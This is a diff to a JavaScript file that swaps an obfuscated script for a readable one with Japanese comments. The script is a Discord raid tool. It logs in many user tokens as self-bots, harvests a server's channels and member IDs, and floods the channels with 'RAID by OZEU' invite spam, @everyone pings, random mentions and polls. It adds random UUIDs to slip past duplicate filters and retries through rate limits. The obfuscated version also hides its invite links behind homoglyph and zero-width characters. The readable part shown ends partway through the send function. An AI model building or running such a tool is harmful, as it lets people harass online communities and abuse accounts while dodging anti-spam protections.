@@ -1,1 +1,328 @@
-const _0x27d5c5=_0x45fe;(function(_0x35d1ff,_0x398a71){const _0xb80435=_0x45fe,_0x12dc41=_0x35d1ff();while(!![]){try{const _0x132114=parseInt(_0xb80435(0x86))/0x1+parseInt(_0xb80435(0xb8))/0x2*(-parseInt(_0xb80435(0x97))/0x3)+-parseInt(_0xb80435(0x8b))/0x4+parseInt(_0xb80435(0xba))/0x5*(parseInt(_0xb80435(0x83))/0x6)+parseInt(_0xb80435(0xb3))/0x7*(parseInt(_0xb80435(0xcb))/0x8)+parseInt(_0xb80435(0xa6))/0x9+-parseInt(_0xb80435(0xbb))/0xa*(parseInt(_0xb80435(0xa7))/0xb);if(_0x132114===_0x398a71)break;else _0x12dc41['push'](_0x12dc41['shift']());}catch(_0x4c0458){_0x12dc41['push'](_0x12dc41['shift']());}}}(_0x447d,0xa6ffa));const logEl=document[_0x27d5c5(0xd4)](_0x27d5c5(0xdd)),x_super_properties=_0x27d5c5(0x9e);function appendLog(_0x35bf03){const _0x2e0872=_0x27d5c5,_0x401cb3=new Date()[_0x2e0872(0xcc)]();logEl[_0x2e0872(0x90)]+='\x0a'+_0x401cb3+_0x2e0872(0x7b)+_0x35bf03,logEl[_0x2e0872(0xa3)]=logEl[_0x2e0872(0xad)];}function clearLog(){const _0x3509a7=_0x27d5c5;logEl[_0x3509a7(0x90)]='';}let shouldStopSpam=![];const tokensInput=document[_0x27d5c5(0xd4)](_0x27d5c5(0x96)),guildInput=document[_0x27d5c5(0xd4)](_0x27d5c5(0xa9)),channelInput=document[_0x27d5c5(0xd4)](_0x27d5c5(0x78)),randomizeCheckbox=document[_0x27d5c5(0xd4)](_0x27d5c5(0xa0)),allmentionCheckbox=document[_0x27d5c5(0xd4)](_0x27d5c5(0x77)),delayInput=document[_0x27d5c5(0xd4)]('delay'),limitInput=document[_0x27d5c5(0xd4)]('limit'),mentionInput=document[_0x27d5c5(0xd4)](_0x27d5c5(0xa1)),pollTitleInput=document[_0x27d5c5(0xd4)](_0x27d5c5(0x7d)),pollAnswersInput=document['getElementById'](_0x27d5c5(0xd2)),autoFillBtn=document[_0x27d5c5(0xd4)](_0x27d5c5(0x74)),fetchMentionsBtn=document[_0x27d5c5(0xd4)]('fetchMentions'),submitBtn=document[_0x27d5c5(0xd4)]('submitBtn'),stopBtn=document[_0x27d5c5(0xd4)]('stopSpam'),leaveBtn=document[_0x27d5c5(0xd4)](_0x27d5c5(0xbf)),form=document[_0x27d5c5(0xd4)](_0x27d5c5(0x84));function sleep(_0x1707cc){return new Promise(_0x42a261=>setTimeout(_0x42a261,_0x1707cc));}function parseList(_0x13c740){const _0x12bc64=_0x27d5c5,_0xd7fc89=_0x13c740[_0x12bc64(0xc4)](/[\s,]+/)['map'](_0x16fac8=>_0x16fac8[_0x12bc64(0xa8)]())['filter'](_0x3c9d2f=>_0x3c9d2f);return[...new Set(_0xd7fc89)];}async function leaveGuild(_0x325513,_0x11e877){const _0x25184a=_0x27d5c5,_0x5e9536=await fetch(_0x25184a(0xd6)+_0x11e877,{'method':_0x25184a(0xb1),'headers':{'Authorization':_0x325513,'Content-Type':_0x25184a(0x9b),'x-super-properties':x_super_properties},'body':JSON['stringify']({'lurking':![]}),'referrerPolicy':'no-referrer'});if(_0x5e9536['status']===0xcc)appendLog(_0x25184a(0x80)+_0x325513['slice'](0x0,0xa)+_0x25184a(0x7e));else appendLog('❌\x20'+_0x325513['slice'](0x0,0xa)+'*****\x20-\x20退出失敗('+JSON['stringify'](await _0x5e9536[_0x25184a(0x94)]())+')');}autoFillBtn['addEventListener'](_0x27d5c5(0xcf),async()=>{const _0x32123a=_0x27d5c5;clearLog();const _0x2d8af9=parseList(tokensInput[_0x32123a(0xc8)]),_0x479e9f=guildInput[_0x32123a(0xc8)][_0x32123a(0xa8)]();if(!_0x2d8af9['length'])return appendLog('⚠️\x20トークンを入力してください');if(!_0x479e9f)return appendLog(_0x32123a(0x8c));try{const _0x3198a2=await fetch(_0x32123a(0x9c)+_0x479e9f+_0x32123a(0x73),{'headers':{'Authorization':_0x2d8af9[0x0],'Content-Type':_0x32123a(0x9b),'x-super-properties':x_super_properties},'referrerPolicy':_0x32123a(0xb4)});if(!_0x3198a2['ok'])throw new Error(JSON['stringify'](await _0x3198a2[_0x32123a(0x94)]()));const _0x252259=await _0x3198a2[_0x32123a(0x94)](),_0x225410=_0x252259[_0x32123a(0xc9)](_0x1b81ca=>_0x1b81ca[_0x32123a(0xb9)]===0x0)[_0x32123a(0xcd)](_0x5e9f01=>_0x5e9f01['id']);if(!_0x225410[_0x32123a(0xd8)])return appendLog(_0x32123a(0xc1));channelInput['value']=_0x225410[_0x32123a(0x93)](','),appendLog(_0x32123a(0xac));}catch(_0x50ec12){appendLog('❌\x20'+token[_0x32123a(0xc3)](0x0,0xa)+'*****\x20-\x20エラー：'+_0x50ec12[_0x32123a(0xc0)]);}}),fetchMentionsBtn[_0x27d5c5(0x95)](_0x27d5c5(0xcf),async()=>{const _0xd780f0=_0x27d5c5;clearLog();const _0xf6e250=parseList(tokensInput['value']),_0x392612=guildInput[_0xd780f0(0xc8)][_0xd780f0(0xa8)](),_0x535eb4=parseList(channelInput[_0xd780f0(0xc8)]);if(!_0xf6e250[_0xd780f0(0xd8)])return appendLog('⚠️\x20トークンを入力してください');if(!_0x392612)return appendLog(_0xd780f0(0x8c));if(!_0x535eb4[_0xd780f0(0xd8)])return appendLog('⚠️\x20チャンネルIDを入力してください');const _0x19e53f=new WebSocket('wss://gateway.discord.gg/?v=9&encoding=json');_0x19e53f['onopen']=()=>{const _0x4447f2=_0xd780f0;_0x19e53f['send'](JSON[_0x4447f2(0x76)]({'op':0x2,'d':{'token':_0xf6e250[0x0],'properties':{'os':'Windows','browser':_0x4447f2(0x88),'device':'pc'},'intents':0x1<<0xc}}));},_0x19e53f['onmessage']=_0x5a4b5f=>{const _0x393d51=_0xd780f0,_0x52a7c2=JSON[_0x393d51(0xca)](_0x5a4b5f[_0x393d51(0xbe)]);_0x52a7c2['op']===0x0&&_0x52a7c2['t']===_0x393d51(0x72)&&_0x19e53f[_0x393d51(0xb7)](JSON['stringify']({'op':0xe,'d':{'guild_id':_0x392612,'typing':![],'activities':![],'threads':!![],'channels':{[_0x535eb4[0x0]]:[[0x0,0x0]]}}}));if(_0x52a7c2['t']==='GUILD_MEMBER_LIST_UPDATE'){const _0x10a604=_0x52a7c2['d']['ops'][0x0][_0x393d51(0x75)][_0x393d51(0xc9)](_0x27aafd=>_0x27aafd[_0x393d51(0x7a)])['map'](_0x8f96ee=>_0x8f96ee[_0x393d51(0x7a)][_0x393d51(0xd0)]['id']);if(_0x10a604['length'])mentionInput[_0x393d51(0xc8)]=_0x10a604['join'](','),appendLog(_0x393d51(0xb5));else appendLog(_0x393d51(0x91));_0x19e53f[_0x393d51(0x87)]();}},_0x19e53f[_0xd780f0(0x9f)]=()=>{const _0x4796ec=_0xd780f0;appendLog(_0x4796ec(0x85)),_0x19e53f[_0x4796ec(0x87)]();};});function _0x45fe(_0xea3cfc,_0x3b80f0){const _0x447d7c=_0x447d();return _0x45fe=function(_0x45fe73,_0x5901ff){_0x45fe73=_0x45fe73-0x72;let _0xd6505d=_0x447d7c[_0x45fe73];return _0xd6505d;},_0x45fe(_0xea3cfc,_0x3b80f0);}function _0x447d(){const _0x4124d6=['message','チャンネルが見つかりません','POST','slice','split','#\x20おぜうの集いに今すぐ参加！\x0a##\x20https:////ｃ͏a͏ｎ͏a͏ｒ͏ｙ͏。͏𝑑͏𝓲͏Ｓ͏𝐜͏𝑜͏ｒ͏ᵈ͏Ａ͏pＰ͏。͏𝐜͏𝑜͏ｍ͏google.com⁂⌘∮/%2e.../%69%6e%76%69%74%65youtube.com‖∠∇../../../white_check_marktwitter.com]「＠../../../../hK5He8z8Ge\x0a-#\x20[gif](https://𝕚͏𝕞͏𝕘͏𝕦͏𝕣͏.͏𝕔͏𝕠͏𝕞͏/yNx4Me2)\x0a-#\x20[gif](https://𝗺͏𝗲͏𝗱͏𝗶͏𝗮͏.͏𝗱͏𝗶͏𝘀͏𝗰͏𝗼͏𝗿͏𝗱͏𝗮͏𝗽͏𝗽͏.͏𝗻͏𝗲͏𝘁͏/attachments/1341829977850646668/1353001058405978172/IMB_DZBN6p.gif?ex=67e00fed&is=67debe6d&hm=b07d1cf915c35fa1871b655f91d3738eba09ea05683a1abf5b883b0598f3b92a&)\x0a-#\x20[gif](https://𝕚͏𝕞͏𝕘͏𝕦͏𝕣͏.͏𝕔͏𝕠͏𝕞͏/NbBGFcf.mp4)\x0a||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||||\x20||','onclose','実行中...','value','filter','parse','32FgZbom','toLocaleTimeString','map','retry_after','click','user','submit','pollAnswers','content','getElementById','❌\x20トークン(','https://discord.com/api/v9/users/@me/guilds/','querySelector','length','status','*****\x20-\x20送信エラー(',')\x20最大リトライ回数に達しました。','random','log','READY','/channels','autoFillChannels','items','stringify','allmention','channelIds','randomMentions','member','\x20-\x20','https://x.gd/fpRON','pollTitle','*****','✅\x20退出処理完了','✅\x20退出成功:\x20','loading','\x20|\x20再試行中...','2450646EACvSY','form','❌\x20WebSocketエラー','381471caVPnf','close','Discord','floor','):\x20','3874808hlqKPE','⚠️\x20サーバーIDを入力してください','all','/messages','disabled','textContent','メンションが見つかりません','詳細不明','join','json','addEventListener','tokens','30DYDUfQ','✅\x20指定数に達しました','⚠️\x20メッセージ内容が入力されていません','checked','application/json','https://discord.com/api/v9/guilds/','wss://gateway.discord.gg/?v=9&encoding=json','eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiaGFzX2NsaWVudF9tb2RzIjpmYWxzZSwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzNC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTM0LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiJodHRwczovL2Rpc2NvcmQuY29tIiwicmVmZXJyaW5nX2RvbWFpbiI6ImRpc2NvcmQuY29tIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjM4NDg4NywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=','onerror','randomize','mentionIds','classList','scrollTop','https://discord.com/api/v9/channels/','Windows','12173517KvKImk','2079JCgoQF','trim','guildId','*****\x20-\x20エラー:\x20','❌\x20認証失敗:\x20','✅\x20チャンネル取得完了','scrollHeight','remove','❌\x20WebSocket\x20エラー:\x20','input','DELETE','@everyone\x0a','419517emvqaz','no-referrer','✅\x20メンション取得完了','onopen','send','108220xaXRhN','type','10abfqei','31580ILRzJK','poll','onmessage','data','leaveBtn'];_0x447d=function(){return _0x4124d6;};return _0x447d();}async function authenticateOnly(_0x4d2c24){return new Promise(_0x3f858d=>{const _0xca7143=_0x45fe,_0x19665c=new WebSocket(_0xca7143(0x9d));_0x19665c[_0xca7143(0xb6)]=()=>{const _0x58ff7b=_0xca7143;_0x19665c['send'](JSON[_0x58ff7b(0x76)]({'op':0x2,'d':{'token':_0x4d2c24,'properties':{'os':_0x58ff7b(0xa5),'browser':_0x58ff7b(0x88),'device':'pc'},'intents':0x0}}));},_0x19665c[_0xca7143(0xbd)]=_0x4caee8=>{const _0x3d0774=_0xca7143,_0x263afe=JSON[_0x3d0774(0xca)](_0x4caee8['data']);if(_0x263afe['t']==='READY')appendLog('✅\x20認証完了:\x20'+_0x4d2c24['slice'](0x0,0xa)+_0x3d0774(0x7e)),_0x19665c['close'](),_0x3f858d(!![]);else _0x263afe['t']==='INVALID_SESSION'&&(appendLog(_0x3d0774(0xab)+_0x4d2c24['slice'](0x0,0xa)+_0x3d0774(0x7e)),_0x19665c[_0x3d0774(0x87)](),_0x3f858d(![]));},_0x19665c[_0xca7143(0x9f)]=()=>{const _0x1317b5=_0xca7143;appendLog(_0x1317b5(0xaf)+_0x4d2c24[_0x1317b5(0xc3)](0x0,0xa)+_0x1317b5(0x7e)),_0x19665c['close'](),_0x3f858d(![]);},_0x19665c[_0xca7143(0xc6)]=()=>{_0x3f858d(![]);};});}async function sendMessage(_0x3b94a1,_0x465f7a,_0x4cdb22,_0x3e9fc9={}){const _0x58d43d=_0x27d5c5,_0x2b968c={'Authorization':_0x3b94a1,'Content-Type':_0x58d43d(0x9b),'x-super-properties':x_super_properties};let _0x3d0634={'content':_0x4cdb22||''};if(_0x3e9fc9[_0x58d43d(0xa0)])_0x3d0634[_0x58d43d(0xd3)]+='\x0a'+crypto['randomUUID']();if(_0x3e9fc9[_0x58d43d(0x77)])_0x3d0634['content']=_0x58d43d(0xb2)+_0x3d0634[_0x58d43d(0xd3)];if(_0x3e9fc9[_0x58d43d(0x79)]){const _0xbd8d4c=_0x3e9fc9[_0x58d43d(0x79)][Math[_0x58d43d(0x89)](Math[_0x58d43d(0xdc)]()*_0x3e9fc9[_0x58d43d(0x79)][_0x58d43d(0xd8)])];_0x3d0634[_0x58d43d(0xd3)]='<@'+_0xbd8d4c+'>\x0a'+_0x3d0634['content'];}if(_0x3e9fc9[_0x58d43d(0x7d)]&&_0x3e9fc9['pollAnswers'])_0x3d0634[_0x58d43d(0xbc)]={'question':{'text':_0x3e9fc9[_0x58d43d(0x7d)]},'answers':_0x3e9fc9[_0x58d43d(0xd2)]['map'](_0x5a1ae3=>({'poll_media':{'text':_0x5a1ae3[_0x58d43d(0xa8)]()}})),'allow_multiselect':![],'duration':0x1,'layout_type':0x1};const _0x5a8792=await fetch(_0x58d43d(0xa4)+_0x465f7a+_0x58d43d(0x8e),{'method':_0x58d43d(0xc2),'headers':_0x2b968c,'body':JSON[_0x58d43d(0x76)](_0x3d0634),'referrerPolicy':'no-referrer'});return _0x5a8792;}async function sendMessageWithRetry(_0xf5e0e,_0x3a8033,_0x24a16e,_0x244fff={},_0x6ba7a=0x5,_0x12d000=0xbb8){const _0x42e456=_0x27d5c5;let _0x3f5997=0x0;while(_0x3f5997<_0x6ba7a){try{const _0x477843=await sendMessage(_0xf5e0e,_0x3a8033,_0x24a16e,_0x244fff);if(_0x477843['ok'])return appendLog('✅\x20'+_0xf5e0e[_0x42e456(0xc3)](0x0,0xa)+'*****\x20-\x20メッセージ送信成功'),!![];else{if(_0x477843[_0x42e456(0xd9)]===0x1ad){const _0x567f87=await _0x477843[_0x42e456(0x94)](),_0x1a73db=(_0x567f87?.[_0x42e456(0xce)]||0x1)*0x3e8;appendLog('⏳\x20\x20'+_0xf5e0e[_0x42e456(0xc3)](0x0,0xa)+'*****\x20-\x20レート制限:\x20'+_0x1a73db/0x3e8+'s'),await sleep(_0x1a73db),_0x3f5997++;}else{if(_0x477843['status']===0x190){const _0x54c8ce=await _0x477843[_0x42e456(0x94)]();appendLog('❌\x20'+_0xf5e0e[_0x42e456(0xc3)](0x0,0xa)+'*****\x20-\x20送信エラー('+_0x477843['status']+_0x42e456(0x8a)+(JSON['stringify'](_0x54c8ce)||_0x42e456(0x92))),authtest=await authenticateOnly(_0xf5e0e);if(!authtest)return![];}else{const _0x3a467e=await _0x477843[_0x42e456(0x94)]();return appendLog('❌\x20'+_0xf5e0e[_0x42e456(0xc3)](0x0,0xa)+_0x42e456(0xda)+_0x477843[_0x42e456(0xd9)]+_0x42e456(0x8a)+(JSON[_0x42e456(0x76)](_0x3a467e)||_0x42e456(0x92))),![];}}}}catch(_0x20fe53){appendLog('⚠️\x20'+_0xf5e0e[_0x42e456(0xc3)](0x0,0xa)+_0x42e456(0xaa)+_0x20fe53[_0x42e456(0xc0)]+_0x42e456(0x82)),await sleep(_0x12d000),_0x3f5997++;}}return appendLog(_0x42e456(0xd5)+_0xf5e0e['slice'](0x0,0xa)+_0x42e456(0xdb)),![];}function checkFormValidity(){const _0xdc7d53=_0x27d5c5,_0x442c50=tokensInput[_0xdc7d53(0xc8)][_0xdc7d53(0xa8)](),_0x17c5dc=guildInput['value'][_0xdc7d53(0xa8)]();submitBtn[_0xdc7d53(0x8f)]=!(_0x442c50&&_0x17c5dc);}tokensInput[_0x27d5c5(0x95)](_0x27d5c5(0xb0),checkFormValidity),guildInput['addEventListener'](_0x27d5c5(0xb0),checkFormValidity),checkFormValidity(),form[_0x27d5c5(0x95)](_0x27d5c5(0xd1),async _0x3d72f2=>{const _0x4c2e1f=_0x27d5c5;_0x3d72f2['preventDefault']();const _0x249e9f=document[_0x4c2e1f(0xd7)]('input[name=\x22messageOption\x22]:checked');let _0x4861e9;if(_0x249e9f[_0x4c2e1f(0xc8)]==='A')_0x4861e9='#\x20RAID\x20by\x20OZEU.\x20join\x20now\x0a#\x20ozeu\x20on\x20top\x0ahttps://discord.gg/ozeu\x0ahttps://discord.gg/ozeu-x';else{if(_0x249e9f['value']==='B')_0x4861e9=_0x4c2e1f(0xc5);else _0x249e9f[_0x4c2e1f(0xc8)]==='C'&&(_0x4861e9=_0x4c2e1f(0x7c));}if(!_0x4861e9){appendLog(_0x4c2e1f(0x99));return;}submitBtn[_0x4c2e1f(0x8f)]=!![],submitBtn[_0x4c2e1f(0xa2)]['add'](_0x4c2e1f(0x81)),submitBtn['textContent']=_0x4c2e1f(0xc7),shouldStopSpam=![],stopBtn[_0x4c2e1f(0x8f)]=![];const _0x4f37e9=parseList(tokensInput['value']),_0x37ef8a=guildInput['value'][_0x4c2e1f(0xa8)](),_0x477eeb=parseList(channelInput[_0x4c2e1f(0xc8)]),_0x1ee7ed=randomizeCheckbox[_0x4c2e1f(0x9a)],_0x224e9f=allmentionCheckbox['checked'],_0x2dd6e2=parseFloat(delayInput[_0x4c2e1f(0xc8)])||0x0,_0x150108=limitInput[_0x4c2e1f(0xc8)][_0x4c2e1f(0xa8)]()?parseInt(limitInput[_0x4c2e1f(0xc8)]):Infinity,_0x4bd674=mentionInput[_0x4c2e1f(0xc8)][_0x4c2e1f(0xa8)]()?parseList(mentionInput['value']):null,_0x41aa47=pollTitleInput[_0x4c2e1f(0xc8)][_0x4c2e1f(0xa8)]()||null,_0x21d25d=pollAnswersInput[_0x4c2e1f(0xc8)]['trim']()?parseList(pollAnswersInput[_0x4c2e1f(0xc8)]):null;let _0x459a8d=0x0;const _0x2dc1cf=_0x4f37e9['map'](_0x3fad86=>{return async()=>{const _0x420158=_0x45fe;let _0x5b0f99=0x0;while(!shouldStopSpam&&_0x459a8d<_0x150108){_0x5b0f99>=_0x477eeb[_0x420158(0xd8)]&&(_0x5b0f99=0x0);const _0x2fbf00=_0x477eeb[_0x5b0f99];_0x5b0f99++;const _0xe1b70b=await sendMessageWithRetry(_0x3fad86,_0x2fbf00,_0x4861e9,{'randomize':_0x1ee7ed,'randomMentions':_0x4bd674,'pollTitle':_0x41aa47,'pollAnswers':_0x21d25d,'allmention':_0x224e9f});if(_0xe1b70b)_0x459a8d++;if(_0x459a8d>=_0x150108){appendLog(_0x420158(0x98));break;}_0x2dd6e2&&await sleep(_0x2dd6e2*0x3e8);}};});await Promise[_0x4c2e1f(0x8d)](_0x2dc1cf[_0x4c2e1f(0xcd)](_0xcb1c7b=>_0xcb1c7b())),submitBtn['disabled']=![],submitBtn[_0x4c2e1f(0xa2)]['remove'](_0x4c2e1f(0x81)),stopBtn[_0x4c2e1f(0x8f)]=!![],submitBtn[_0x4c2e1f(0x90)]='実行',appendLog('✅\x20完了');}),stopBtn[_0x27d5c5(0x95)](_0x27d5c5(0xcf),()=>{const _0x20c71b=_0x27d5c5;shouldStopSpam=!![],appendLog('🛑\x20スパムを停止します...'),submitBtn[_0x20c71b(0x8f)]=![],submitBtn[_0x20c71b(0xa2)][_0x20c71b(0xae)](_0x20c71b(0x81)),submitBtn[_0x20c71b(0x90)]='実行';}),leaveBtn[_0x27d5c5(0x95)](_0x27d5c5(0xcf),async()=>{const _0x3af79a=_0x27d5c5;shouldStopSpam=!![],stopBtn[_0x3af79a(0x8f)]=!![],appendLog('🛑\x20スパムを停止します...');const _0x2c539d=parseList(tokensInput[_0x3af79a(0xc8)]),_0xaa9735=guildInput['value'][_0x3af79a(0xa8)]();if(!_0x2c539d[_0x3af79a(0xd8)])return appendLog('⚠️\x20トークンを入力してください');if(!_0xaa9735)return appendLog(_0x3af79a(0x8c));for(const _0x26ca2c of _0x2c539d)await leaveGuild(_0x26ca2c,_0xaa9735);appendLog(_0x3af79a(0x7f)),submitBtn['disabled']=![],submitBtn['classList']['remove'](_0x3af79a(0x81)),submitBtn[_0x3af79a(0x90)]='実行';});
+const logEl = document.getElementById('log');
+const x_super_properties = "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiaGFzX2NsaWVudF9tb2RzIjpmYWxzZSwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzNC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTM0LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiJodHRwczovL2Rpc2NvcmQuY29tIiwicmVmZXJyaW5nX2RvbWFpbiI6ImRpc2NvcmQuY29tIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjM4NDg4NywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=";
+
+// ログ出力: タイムスタンプ付きで表示＆スクロール
+function appendLog(text) {
+  const time = new Date().toLocaleTimeString();
+  logEl.textContent += `\n${time} - ${text}`;
+  logEl.scrollTop = logEl.scrollHeight;
+}
+
+// ログクリア
+function clearLog() {
+  logEl.textContent = '';
+}
+
+// スパム停止フラグ
+let shouldStopSpam = false;
+
+ 
+const tokensInput       = document.getElementById('tokens');
+const guildInput        = document.getElementById('guildId');
+const channelInput      = document.getElementById('channelIds');
+
+const randomizeCheckbox = document.getElementById('randomize');
+const allmentionCheckbox = document.getElementById('allmention');
+const delayInput        = document.getElementById('delay');
+const limitInput        = document.getElementById('limit');
+const mentionInput      = document.getElementById('mentionIds');
+const pollTitleInput    = document.getElementById('pollTitle');
+const pollAnswersInput  = document.getElementById('pollAnswers');
+const autoFillBtn       = document.getElementById('autoFillChannels');
+const fetchMentionsBtn  = document.getElementById('fetchMentions');
+const submitBtn         = document.getElementById('submitBtn');
+const stopBtn           = document.getElementById('stopSpam');
+const leaveBtn          = document.getElementById('leaveBtn');
+const form              = document.getElementById('form');
+
+
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+// 入力文字列をカンマまたは改行で分割し、空要素・重複を排除する
+function parseList(input) {
+  const arr = input.split(/[\s,]+/)
+    .map(s => s.trim())
+    .filter(s => s);
+  return [...new Set(arr)];
+}
+
+async function leaveGuild(token, guildId) {
+	const res = await fetch(`https://discord.com/api/v9/users/@me/guilds/${guildId}`, {
+		method: 'DELETE',
+		headers: { 'Authorization': token , 'Content-Type': 'application/json' , 'x-super-properties': x_super_properties },
+    body: JSON.stringify({"lurking":false}),
+    referrerPolicy: "no-referrer"
+	});
+	if (res.status === 204) appendLog(`✅ 退出成功: ${token.slice(0, 10)}*****`);
+	else appendLog(`❌ ${token.slice(0, 10)}***** - 退出失敗(${JSON.stringify(await res.json())})`);
+}
+
+// チャンネル自動取得
+autoFillBtn.addEventListener('click', async () => {
+  clearLog();
+  const tokens = parseList(tokensInput.value);
+  const guildId = guildInput.value.trim();
+  if (!tokens.length) return appendLog('⚠️ トークンを入力してください');
+  if (!guildId)    return appendLog('⚠️ サーバーIDを入力してください');
+  try {
+    const res = await fetch(`https://discord.com/api/v9/guilds/${guildId}/channels`, { headers: { Authorization: tokens[0], 'Content-Type': 'application/json' , 'x-super-properties': x_super_properties }, referrerPolicy: "no-referrer" });
+    if (!res.ok) throw new Error(JSON.stringify(await res.json()));
+    const data = await res.json();
+    const ids  = data.filter(ch => ch.type === 0).map(ch => ch.id);
+    if (!ids.length) return appendLog('チャンネルが見つかりません');
+    channelInput.value = ids.join(',');
+    appendLog('✅ チャンネル取得完了');
+  } catch (e) {
+    appendLog(`❌ ${token.slice(0, 10)}***** - エラー：${e.message}`);
+  }
+});
+
+// メンション取得
+fetchMentionsBtn.addEventListener('click', async () => {
+  clearLog();
+  const tokens     = parseList(tokensInput.value);
+  const guildId    = guildInput.value.trim();
+  const channelIds = parseList(channelInput.value);
+  if (!tokens.length)    return appendLog('⚠️ トークンを入力してください');
+  if (!guildId)         return appendLog('⚠️ サーバーIDを入力してください');
+  if (!channelIds.length) return appendLog('⚠️ チャンネルIDを入力してください');
+  const ws = new WebSocket('wss://gateway.discord.gg/?v=9&encoding=json');
+  ws.onopen = () => {
+    ws.send(JSON.stringify({ op: 2, d: { token: tokens[0], properties: { os: 'Windows', browser: 'Discord', device: 'pc' }, intents: 1 << 12 } }));
+  };
+  ws.onmessage = event => {
+    const msg = JSON.parse(event.data);
+    if (msg.op === 0 && msg.t === 'READY') {
+      ws.send(JSON.stringify({ op: 14, d: { guild_id: guildId, typing: false, activities: false, threads: true, channels: { [channelIds[0]]: [[0, 0]] } } }));
+    }
+    if (msg.t === 'GUILD_MEMBER_LIST_UPDATE') {
+      const mentions = msg.d.ops[0].items.filter(i => i.member).map(i => i.member.user.id);
+      if (mentions.length) { mentionInput.value = mentions.join(','); appendLog('✅ メンション取得完了'); }
+      else appendLog('メンションが見つかりません');
+      ws.close();
+    }
+  };
+  ws.onerror = () => { appendLog('❌ WebSocketエラー'); ws.close(); };
+});
+
+async function authenticateOnly(token) {
+	return new Promise((resolve) => {
+		const ws = new WebSocket('wss://gateway.discord.gg/?v=9&encoding=json');
+
+		ws.onopen = () => {
+			ws.send(JSON.stringify({
+				op: 2,
+				d: {
+					token,
+					properties: {
+						os: 'Windows',
+						browser: 'Discord',
+						device: 'pc'
+					},
+					intents: 0
+				}
+			}));
+		};
+
+		ws.onmessage = (event) => {
+			const msg = JSON.parse(event.data);
+			if (msg.t === 'READY') {
+				appendLog(`✅ 認証完了: ${token.slice(0, 10)}*****`);
+				ws.close();
+				resolve(true);
+			} else if (msg.t === 'INVALID_SESSION') {
+				appendLog(`❌ 認証失敗: ${token.slice(0, 10)}*****`);
+				ws.close();
+				resolve(false);
+			}
+		};
+
+		ws.onerror = () => {
+			appendLog(`❌ WebSocket エラー: ${token.slice(0, 10)}*****`);
+			ws.close();
+			resolve(false);
+		};
+
+		ws.onclose = () => {
+			// 応答なしで切れた場合もフォールバック
+			resolve(false);
+		};
+	});
+}
+
+// メッセージ送信
+async function sendMessage(token, channelId, content, opts = {}) {
+    const headers = { 'Authorization': token, 'Content-Type': 'application/json', 'x-super-properties': x_super_properties };
+    let body = { content: content || '' };
+    if (opts.randomize) body.content += `\n${crypto.randomUUID()}`;
+    if (opts.allmention) body.content = `@everyone\n${body.content}`;
+    if (opts.randomMentions) {
+      const id = opts.randomMentions[Math.floor(Math.random() * opts.randomMentions.length)];
+      body.content = `<@${id}>\n${body.content}`;
+    }
